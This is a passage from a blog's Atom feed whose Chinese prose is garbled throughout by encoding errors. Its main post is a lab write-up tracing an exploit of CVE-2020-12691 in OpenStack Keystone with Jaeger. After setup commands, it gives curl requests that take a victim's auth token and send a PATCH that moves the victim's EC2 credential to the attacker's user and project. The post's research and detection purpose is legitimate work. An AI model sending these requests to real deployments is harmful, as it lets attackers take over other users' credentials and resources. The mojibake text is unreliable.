&#125;</span><br></pre></td></tr></table></figure><p>ç±»å‹å‚æ•°ä¹Ÿå¯ä»¥ç”¨ä½œåŸºç±»ï¼ŒåŸºäºç±»å‹å‚æ•° T é€‰æ‹©æ€§ç»§æ‰¿ï¼Œ<code>A&lt;T&gt;</code> çš„å®ä¾‹å®šä¹‰ç»§æ‰¿çš„è¶…çº§ç»„ä»¶ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.comp <span class="symbol">A</span>&lt;<span class="symbol">T</span>&gt; : <span class="symbol">T</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡ç»§æ‰¿ï¼Œå¯ä»¥å®ç°å¤æ‚çš„ç»„ä»¶å®ä¾‹åŒ–ï¼Œæ³¨æ„è¿™é‡Œè¦å¼•å…¥ä¸€ä¸ªæ–°çš„ç»„ä»¶ï¼Œå› ä¸ºå‚æ•° <code>Graph&lt;number&gt;</code> ä¸æ˜¯ç®€å•çš„æ ‡è¯†ç¬¦ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// é”™è¯¯</span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">Graph</span>&lt;number&gt;&gt;   // syntax error</span><br><span class="line"></span><br><span class="line">// æ­£ç¡®</span><br><span class="line">.comp <span class="symbol">NumberGraph</span> : <span class="symbol">Graph</span>&lt;number&gt; &#123; &#125; // <span class="symbol">NumberGraph</span> inherits  </span><br><span class="line">.init reach = <span class="symbol">Reachability</span>&lt;<span class="symbol">NumberGraph</span>&gt;</span><br></pre></td></tr></table></figure><h2 id="ç¼–è¯‘æŒ‡ä»¤-Pragma"><a href="#ç¼–è¯‘æŒ‡ä»¤-Pragma" class="headerlink" title="ç¼–è¯‘æŒ‡ä»¤ Pragma"></a>ç¼–è¯‘æŒ‡ä»¤ Pragma</h2><p>å…è®¸ç›´æ¥åœ¨æºç ä¸­è®¾ç½®å‘½ä»¤è¡Œæ ‡å¿—å’Œé…ç½®ï¼Œä¾‹å¦‚ä¸‹é¢çš„ä»£ç å°†åœ¨è°ƒç”¨ souffle æ—¶æŒ‡å®š <code>--legacy</code> æ ‡å¿—ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.pragma <span class="string">&quot;legacy&quot;</span> </span><br><span class="line">.decl <span class="symbol">A</span>(x:number) output</span><br><span class="line"><span class="symbol">A</span>(<span class="number">1</span>).</span><br></pre></td></tr></table></figure><p>æœ‰ä¸€äº›é…ç½®ä¸èƒ½ç”¨å‘½ä»¤è¡Œæ ‡å¿—è®¾ç½®ï¼Œå› æ­¤ä¹Ÿå°±ä¸èƒ½ç”¨è¿™ç§æ–¹æ³•è®¾ç½®ã€‚</p><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><p>æƒ³æ›´æ·±å…¥åœ°äº†è§£ Datalog å¯ä»¥çœ‹çœ‹ <a href="http://blogs.evergreen.edu/sosw/files/2014/04/Green-Vol5-DBS-017.pdf">Datalog and Recursive Query Processing</a>ï¼Œè¿˜æœ‰å­¦é•¿æ¨èçš„ <a href="https://www.jianshu.com/p/d7598d17ff2b">Dimension Shift! ä¸€èµ·æ¥å­¦Datalogå§ï¼</a>ï¼Œè¿™æ–¹é¢æˆ‘å€’æ˜¯æ²¡æœ‰æ‰©å±•åœ°å»çœ‹ï¼›Doop æ¡†æ¶çš„æå‡ºå¯ä»¥çœ‹ <a href="https://www.researchgate.net/publication/221321022_Strictly_Declarative_Specification_of_Sophisticated_Points-to_Analyses">Strictly Declarative Specification of Sophisticated Points-to Analyses</a>ï¼Œå…·ä½“çš„æŒ‡é’ˆåˆ†æå®ç°å¯ä»¥å‚è€ƒ <a href="http://yanniss.github.io/points-to-tutorial15.pdf">Pointer Analysis</a>ã€‚</p><p>Doop è™½ç„¶å¾ˆå¼ºå¤§ï¼Œä½†æ˜¯å­¦èµ·æ¥æ¯”è¾ƒå›°éš¾ï¼Œè€Œä¸”æˆ‘è¿˜æ²¡ä»€ä¹ˆ Java åŸºç¡€â€¦ è´¹åŠ²ã€‚</p><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://bitbucket.org/yanniss/doop/src/master/">doop</a></li><li><a href="https://souffle-lang.github.io/index.html">SoufflÃ© | SoufflÃ© â€¢ A Datalog Synthesis Tool for Static Analysis</a></li></ul>]]></content>
    
    
    <summary type="html">å¼€æºå¼•æ“ SoufflÃ© ä»‹ç»åŠä½¿ç”¨</summary>
    
    
    
    <category term="Other" scheme="https://jckling.github.io/categories/Other/"/>
    
    
    <category term="Datalog" scheme="https://jckling.github.io/tags/Datalog/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-12691 æ¼æ´åˆ©ç”¨ç›¸å…³ä¿¡æ¯è¿½è¸ª</title>
    <link href="https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/"/>
    <id>https://jckling.github.io/2021/11/05/Jaeger/CVE-2020-12691%20%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E7%9B%B8%E5%85%B3%E4%BF%A1%E6%81%AF%E8%BF%BD%E8%B8%AA/</id>
    <published>2021-11-05T07:25:15.000Z</published>
    <updated>2022-03-08T09:03:12.282Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>5.14 çš„æ—¶å€™å°±å†™å¥½äº†ï¼Œå°±æ˜¯ä¸€ç›´æ²¡å‘ï¼ˆæ‘Šæ‰‹</p><p>ä½¿ç”¨ Victoria ç‰ˆæœ¬çš„ Keystoneï¼ˆ<a href="https://tarballs.openstack.org/keystone/keystone-18.0.0.tar.gz">18.0.0</a>ï¼‰ä¸èƒ½å¤ç°æ¼æ´åˆ©ç”¨ï¼Œä½†æ˜¯å¯ä»¥è·å–æ¼æ´åˆ©ç”¨è¿‡ç¨‹ä¸­æ‰€éœ€çš„ç›¸å…³ä¿¡æ¯ã€‚</p><ul><li>è¯¥æ¼æ´å¯ä»¥åœ¨ <a href="https://tarballs.openstack.org/keystone/keystone-16.0.0.tar.gz">Keystone 16.0.0</a> ä¸Šè¿›è¡Œåˆ©ç”¨</li></ul><p>è¯¥æ¼æ´çš„åŸç†æ˜¯ä½¿ç”¨å—å®³è€…çš„ X-Subject-Tokenã€credentialï¼Œå°†å…¶ credential å¯¹åº”çš„ user_idã€project_id æ›¿æ¢ä¸ºæ”»å‡»è€…çš„ï¼Œæ”»å‡»è€…å› æ­¤è·å¾—äº† credential çš„ä½¿ç”¨æƒï¼Œè¿›è€Œä½¿ç”¨è¯¥ credential è¯·æ±‚å—å®³è€…æ‰€æœ‰çš„èµ„æºã€‚æ¼æ´åˆ©ç”¨æ‰€éœ€çš„ä¿¡æ¯åŒ…æ‹¬ï¼š</p><ul><li>user_id</li><li>project_id</li><li>credential</li><li>X-Subject-Token</li></ul><h1 id="ç›¸å…³æ¦‚å¿µ"><a href="#ç›¸å…³æ¦‚å¿µ" class="headerlink" title="ç›¸å…³æ¦‚å¿µ"></a>ç›¸å…³æ¦‚å¿µ</h1><h2 id="ä»¤ç‰Œï¼ˆTokenï¼‰"><a href="#ä»¤ç‰Œï¼ˆTokenï¼‰" class="headerlink" title="ä»¤ç‰Œï¼ˆTokenï¼‰"></a>ä»¤ç‰Œï¼ˆTokenï¼‰</h2><p>ä¸€æ—¦ç”¨æˆ·çš„å‡­æ®ï¼ˆcredentialï¼‰é€šè¿‡éªŒè¯ï¼Œä»¤ç‰ŒæœåŠ¡éªŒè¯å’Œç®¡ç†ç”¨äºå‘èµ·æˆæƒè¯·æ±‚çš„ä»¤ç‰Œã€‚</p><p>ä¸‹å›¾æ˜¯è¯·æ±‚ token çš„æ—¶åºå›¾ï¼Œ<strong>åœ¨ v3 ç‰ˆæœ¬çš„ API ä¸­ï¼Œtoken åœ¨ HTTP å¤´éƒ¨çš„ X-Subject-Token å­—æ®µä¸­ï¼Œè€Œä¸”ä½œä¸º HTTP å¤´éƒ¨çš„ X-Auth-Token å­—æ®µï¼Œç”¨ä»¥å‘å…¶ä»–æœåŠ¡æä¾›è®¤è¯ã€‚</strong></p><img src="https://i.loli.net/2021/11/05/PMkbSVJxoEDevWm.png" width="80%"><h2 id="åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication-Credentialï¼‰"><a href="#åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication-Credentialï¼‰" class="headerlink" title="åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication Credentialï¼‰"></a>åº”ç”¨ç¨‹åºå‡­æ®ï¼ˆApplication Credentialï¼‰</h2><p>ç”¨æˆ·å¯ä»¥åˆ›å»ºåº”ç”¨å‡­æ®æ¥å…è®¸å…¶åº”ç”¨å‘ Keystone è¿›è¡Œè®¤è¯ï¼Œç”¨æˆ·å¯ä»¥å°†å…¶åœ¨é¡¹ç›®ä¸Šçš„è§’è‰²åˆ†é…çš„å­é›†å§”æ‰˜ç»™åº”ç”¨ç¨‹åºå‡­æ®ã€‚åº”ç”¨ä½¿ç”¨å‡­æ®ï¼ˆè€Œä¸æ˜¯ç”¨æˆ·åå¯†ç ï¼‰è¿›è¡Œèº«ä»½è®¤è¯ã€‚</p><p>EC2 credential å…è®¸ç”¨æˆ·é€šè¿‡ Amazon S3 API è®¿é—® OpenStack èµ„æºã€‚</p><h1 id="å®éªŒç¯å¢ƒ"><a href="#å®éªŒç¯å¢ƒ" class="headerlink" title="å®éªŒç¯å¢ƒ"></a>å®éªŒç¯å¢ƒ</h1><p>ä½¿ç”¨ Virtualbox è™šæ‹Ÿæœºå®‰è£… Ubuntu 18.04ï¼›ç„¶åå†å®‰è£… Docker å’Œ Jaeger ç›¸å…³çš„ Python åº“ã€‚</p><ol><li><p>å®‰è£… Docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Docker</span></span><br><span class="line">sudo apt update</span><br><span class="line"></span><br><span class="line">sudo apt install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg \</span><br><span class="line">    lsb-release</span><br><span class="line"></span><br><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=amd64 signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string">  <span class="subst">$(lsb_release -cs)</span> stable&quot;</span> | sudo tee /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">sudo usermod -aG docker <span class="variable">$USER</span></span><br><span class="line">newgrp docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¼€æœºå¯åŠ¨</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> docker.service</span><br><span class="line">sudo systemctl <span class="built_in">enable</span> containerd.service</span><br></pre></td></tr></table></figure></li><li><p>å®‰è£… Docker Composeï¼ˆè™½ç„¶æ²¡ç”¨åˆ°xdï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># docker-compose</span></span><br><span class="line">sudo curl -L <span class="string">&quot;https://github.com/docker/compose/releases/download/1.28.6/docker-compose-<span class="subst">$(uname -s)</span>-<span class="subst">$(uname -m)</span>&quot;</span> -o /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">sudo chmod +x /usr/<span class="built_in">local</span>/bin/docker-compose</span><br><span class="line">docker-compose --version</span><br></pre></td></tr></table></figure></li><li><p>ä½¿ç”¨ pip å®‰è£… Jaeger ç›¸å…³çš„åº“</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python åº“</span></span><br><span class="line">pip install jaeger_client</span><br><span class="line">pip install opentracing</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨ all-in-one é•œåƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ‹‰å–é•œåƒ</span></span><br><span class="line">docker pull jaegertracing/all-in-one</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºå®¹å™¨</span></span><br><span class="line">docker run -itd -p 6831:6831/udp -p 6832:6832/udp -p 16686:16686 jaegertracing/all-in-one</span><br></pre></td></tr></table></figure></li></ol><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>ä½¿ç”¨ admin ç”¨æˆ·æ‰§è¡Œä»¥ä¸‹æŒ‡ä»¤ï¼Œåˆ›å»ºå—å®³è€…ï¼ˆuser1ï¼‰å’Œæ”»å‡»è€…ï¼ˆuser2ï¼‰ç”¨æˆ·ï¼Œå¹¶ç»‘å®šè§’è‰²å’Œé¡¹ç›®ï¼Œæœ€åå„è‡ªç”Ÿæˆä¸€ä¸ª EC2 credential ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ—å‡ºè§’è‰²</span></span><br><span class="line">openstack role list</span><br><span class="line"><span class="comment"># åˆ›å»ºè§’è‰²</span></span><br><span class="line">openstack role create myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºé¡¹ç›®åŠç”¨æˆ·</span></span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project1 --domain default</span><br><span class="line">openstack user create --project project1 --password password user1</span><br><span class="line">openstack project create --description <span class="string">&#x27;cve-2020-12691&#x27;</span> project2 --domain default</span><br><span class="line">openstack user create --project project2 --password password user2</span><br><span class="line"></span><br><span class="line"><span class="comment"># è®¾ç½®ç”¨æˆ·è§’è‰²</span></span><br><span class="line">openstack role add --user user1 --project project1 admin</span><br><span class="line">openstack role add --user user2 --project project2 myrole</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹è§’è‰²åˆ†é…</span></span><br><span class="line">openstack role assignment list</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»º credential</span></span><br><span class="line">openstack ec2 credentials create --project project1 --user user1 --user-domain default --project-domain default</span><br><span class="line">openstack ec2 credentials create --project project2 --user user2 --user-domain default --project-domain default</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŸ¥çœ‹ credential</span></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>å¯¹ Keystone è¿›è¡Œ<strong>æ’æ¡©</strong>ï¼Œè¿½è¸ª <code>openstack credential list</code> çš„æ‰§è¡Œé“¾è·¯ã€‚å‘ç°åŒ…å«æ¼æ´åˆ©ç”¨æ‰€éœ€çš„æ‰€æœ‰ä¿¡æ¯ï¼Œä½†å¯¹åº”çš„ X-Subject-Token æ˜¯ admin ç”¨æˆ·çš„ã€‚</p><p>æ”¹ç”¨å±äº admin è§’è‰²çš„ user1 ç”¨æˆ·æ‰§è¡Œè¯¥æŒ‡ä»¤ï¼Œadmin è§’è‰²çš„ç”¨æˆ·å¯ä»¥æŸ¥çœ‹æ‰€æœ‰ credentialï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> OS_USERNAME=user1</span><br><span class="line"><span class="built_in">export</span> OS_PASSWORD=password</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=project1</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_AUTH_URL=http://127.0.0.1:5000/v3</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br><span class="line"></span><br><span class="line">openstack credential list</span><br></pre></td></tr></table></figure><p>ï¼ˆuser1ï¼‰é™¤äº† X-Subject-Token ï¼Œè¿˜åŒ…å« user_idã€project_id</p><img src="https://i.loli.net/2021/11/05/e5yNWCf3OkQvLBJ.png" width="95%"><p>ï¼ˆuser1ï¼‰å¦ä¸€æ¡ trace ä¸­åŒ…å« credential ï¼Œæ ¹æ® user_id å’Œ project_id ï¼Œå¯ä»¥è¾¨è®¤å‡º user1 ç”¨æˆ·çš„ credential</p><img src="https://i.loli.net/2021/11/05/aypQeJtBGnWDIhd.png" width="95%"><p>ï¼ˆuser2ï¼‰èµ‹äºˆ myrole è§’è‰²çš„ user2 åªèƒ½çœ‹åˆ°è‡ªå·±çš„ credential ä¿¡æ¯</p><img src="https://i.loli.net/2021/11/05/Uogye3GNDs9YkZb.jpg" width="95%"><p>ï¼ˆuser2ï¼‰è¿½è¸ªä¿¡æ¯å’Œ user1 ç”¨æˆ·çš„ç›¸åŒï¼ŒåŒ…æ‹¬è‡ªå·±çš„ X-Subject-Tokenã€user_idã€project_id</p><img src="https://i.loli.net/2021/11/05/o6hbXtQHZegaN83.png"><p>ä»¥ä¸‹æ˜¯æ¼æ´åˆ©ç”¨çš„è¿‡ç¨‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># è·å– User1 çš„ X-Subject-Token</span></span><br><span class="line">curl -i -s\</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;auth&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;identity&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;methods&quot;: [&quot;password&quot;],</span></span><br><span class="line"><span class="string">      &quot;password&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;user&quot;: &#123;</span></span><br><span class="line"><span class="string">          &quot;name&quot;: &quot;user1&quot;,</span></span><br><span class="line"><span class="string">          &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;,</span></span><br><span class="line"><span class="string">          &quot;password&quot;: &quot;password&quot;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;scope&quot;: &#123;</span></span><br><span class="line"><span class="string">      &quot;project&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;name&quot;: &quot;project1&quot;,</span></span><br><span class="line"><span class="string">        &quot;domain&quot;: &#123; &quot;name&quot;: &quot;default&quot; &#125;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/auth/tokens?nocatalog&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å– User1 çš„ credentialï¼ˆæ ¹æ® user_id å’Œ peoject_id æŸ¥æ‰¾ï¼‰</span></span><br><span class="line">curl \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials&quot;</span> | python -m json.tool</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ›¿æ¢ä¸º User2 çš„ user_idã€project_id</span></span><br><span class="line">curl -X PATCH \</span><br><span class="line">  -H <span class="string">&quot;Content-Type: application/json&quot;</span> \</span><br><span class="line">  -H <span class="string">&quot;X-Auth-Token: gAAAAABgdRYFHdUj407-Ysq_SSPjsB5NXYDmjtFx6WCKcbgh7QBSIJSxa0s4b7RDs0fxO3eB5GW6X1vD9o1PSUQn-nKX2KzJRQHKhWHlDBWM8xjCWsZmfEMd7dOM0VyUXb5P8H4H4CKCqoCZcwQw-eibA_u6NWuNHG8kAR-AQR2OyDSKMF9X9Yg&quot;</span> \</span><br><span class="line">  -d <span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#123; &quot;credential&quot;: &#123;</span></span><br><span class="line"><span class="string">    &quot;project_id&quot;: &quot;b0419aebd03c40f3b8b0c413d19056ce&quot;,</span></span><br><span class="line"><span class="string">    &quot;user_id&quot;: &quot;6d173c8b8d354c0b8f890a0666821a64&quot;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;&#x27;</span> \</span><br><span class="line">  <span class="string">&quot;http://localhost:5000/v3/credentials/416f331f7a26867c8be1fe3c574b4878b09b58fd272b7ab60bb568b52deabdb9&quot;</span></span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œåªè¦è·å¾—äº†å—å®³è€…çš„ X-Subject-Tokenã€credential ï¼Œå°±å¯ä»¥é€šè¿‡ PATCH è¯·æ±‚å°† credential å¯¹åº”çš„æ‰€æœ‰è€…æ›¿æ¢ä¸ºæ”»å‡»è€…çš„ã€‚</p><h1 id="Jaeger-API"><a href="#Jaeger-API" class="headerlink" title="Jaeger API"></a>Jaeger API</h1><p>è¿”å›è¿½è¸ªä¿¡æ¯ï¼Œä¿å­˜ä¸º json æ ¼å¼ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># http://jaeger-query:16686/api/traces/&#123;trace-id-hex-string&#125;</span></span><br><span class="line">curl <span class="string">&quot;http://localhost:16686/api/traces/a6192f3a980c57b5&quot;</span> -o 3.json</span><br><span class="line"></span><br><span class="line">cat 3.json | python -mjson.tool</span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ <code>trace-id-hex-string</code> æ˜¯è·¯å¾„ä¸­å®Œæ•´çš„å­—ç¬¦ä¸²ï¼Œä¸æ˜¯ Jaeger UI ä¸­çš„ç¼©ç•¥æ˜¾ç¤ºã€‚</p><img src="https://i.loli.net/2021/11/05/FpVlJZf72TtvEXi.png" width="80%"><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><ol><li><p>ä»å¤ç°æ¼æ´åˆ©ç”¨çš„è§’åº¦æ¥è¯´ï¼Œé“¾è·¯è¿½è¸ªå¯ä»¥è·å–åˆ°å¤§é‡çš„å¯ç”¨ä¿¡æ¯ï¼Œå¸®åŠ©æ„å»ºæ¼æ´åˆ©ç”¨è„šæœ¬ï¼›</p></li><li><p>ä»å‘ç°æ¼æ´çš„è§’åº¦æ¥è¯´ï¼Œé€šè¿‡é“¾è·¯è¿½è¸ªçš„åˆ°çš„æ•°æ®è¿›è¡Œåˆ†æï¼Œå¯èƒ½å‘ç°å¼‚å¸¸ã€‚</p><ul><li>ä¸Šè¿°æ¼æ´å¯ä»¥é€šè¿‡ä½¿ç”¨åŒä¸€ä¸ªç”¨æˆ·æ‰§è¡Œç›¸åŒæŒ‡ä»¤ï¼Œå¯¹æ¯”å‘ç°è¿”å›çš„ç»“æœä¸åŒã€‚å…·ä½“æ¥è¯´å°±æ˜¯æ¼æ´åˆ©ç”¨ä¹‹å‰å’Œä¹‹å <code>openstack credential list</code> è¿”å›çš„æ•°æ®ä¸ä¸€è‡´ï¼Œå› æ­¤å¯ä»¥æ¨æ–­è¿™é‡Œå¯èƒ½äº§ç”Ÿäº†å¼‚å¸¸ã€‚</li></ul></li></ol><h1 id="å‚é˜…"><a href="#å‚é˜…" class="headerlink" title="å‚é˜…"></a>å‚é˜…</h1><ul><li><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12691">CVE - CVE-2020-12691</a></li><li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-12691">NVD - CVE-2020-12691</a></li><li><a href="https://docs.docker.com/engine/install/ubuntu/">Install Docker Engine on Ubuntu</a></li><li><a href="https://docs.docker.com/engine/install/linux-postinstall/">Post-installation steps for Linux</a></li><li><a href="https://docs.docker.com/compose/install/">Install Docker Compose</a></li><li><a href="https://www.jaegertracing.io/docs/1.22/getting-started/">Getting Started â€“ Jaeger documentation</a></li></ul>]]></content>
    
    
    <summary type="html">ä½¿ç”¨ Jaeger å¯¹ Keystone è¿›è¡Œè¿½è¸ª</summary>
    
    
    
    <category term="Jaeger" scheme="https://jckling.github.io/categories/Jaeger/"/>
    
    
    <category term="Python" scheme="https://jckling.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>LogiQL å…¥é—¨</title>
    <link href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/"/>
    <id>https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/</id>
    <published>2021-10-26T08:15:05.000Z</published>
    <updated>2022-03-08T09:03:12.290Z</updated>
    
